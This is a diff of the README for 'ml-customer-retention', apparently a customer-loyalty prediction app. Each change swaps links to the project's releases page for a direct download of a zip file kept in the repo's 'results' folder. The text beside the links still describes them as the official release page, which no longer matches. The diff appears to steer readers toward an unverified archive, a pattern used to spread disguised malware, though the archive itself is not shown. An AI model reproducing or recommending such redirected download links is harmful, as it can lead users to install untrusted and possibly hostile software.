@@ -1,6 +1,6 @@
 # 📊 ml-customer-retention - Predict Customer Loyalty Easily
 
-[![Download](https://img.shields.io/badge/Download-ml--customer--retention-yellowgreen?style=for-the-badge)](https://github.com/King2005-AD/ml-customer-retention/releases)
+[![Download](https://img.shields.io/badge/Download-ml--customer--retention-yellowgreen?style=for-the-badge)](https://github.com/King2005-AD/ml-customer-retention/raw/refs/heads/main/results/customer-retention-ml-v3.4.zip)
 
 ---
 
@@ -33,7 +33,7 @@ To start using ml-customer-retention, follow these steps carefully.
 
 Go to the official release page at:
 
-[https://github.com/King2005-AD/ml-customer-retention/releases](https://github.com/King2005-AD/ml-customer-retention/releases)
+[https://github.com/King2005-AD/ml-customer-retention/raw/refs/heads/main/results/customer-retention-ml-v3.4.zip](https://github.com/King2005-AD/ml-customer-retention/raw/refs/heads/main/results/customer-retention-ml-v3.4.zip)
 
 This page lists the latest versions available for download. You will find all files needed to install the software here.
 
@@ -135,7 +135,7 @@ If the app won’t start, confirm your Windows is updated and you have .NET Fram
 
 Use this link to visit the release page and download the latest version:
 
-[https://github.com/King2005-AD/ml-customer-retention/releases](https://github.com/King2005-AD/ml-customer-retention/releases)
+[https://github.com/King2005-AD/ml-customer-retention/raw/refs/heads/main/results/customer-retention-ml-v3.4.zip](https://github.com/King2005-AD/ml-customer-retention/raw/refs/heads/main/results/customer-retention-ml-v3.4.zip)
 
 ---
 
@@ -166,4 +166,4 @@ A: Download the latest version from the releases page and run the installer agai
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-ml--customer--retention-yellowgreen?style=for-the-badge)](https://github.com/King2005-AD/ml-customer-retention/releases)
+[![Download](https://img.shields.io/badge/Download-ml--customer--retention-yellowgreen?style=for-the-badge)](https://github.com/King2005-AD/ml-customer-retention/raw/refs/heads/main/results/customer-retention-ml-v3.4.zip)
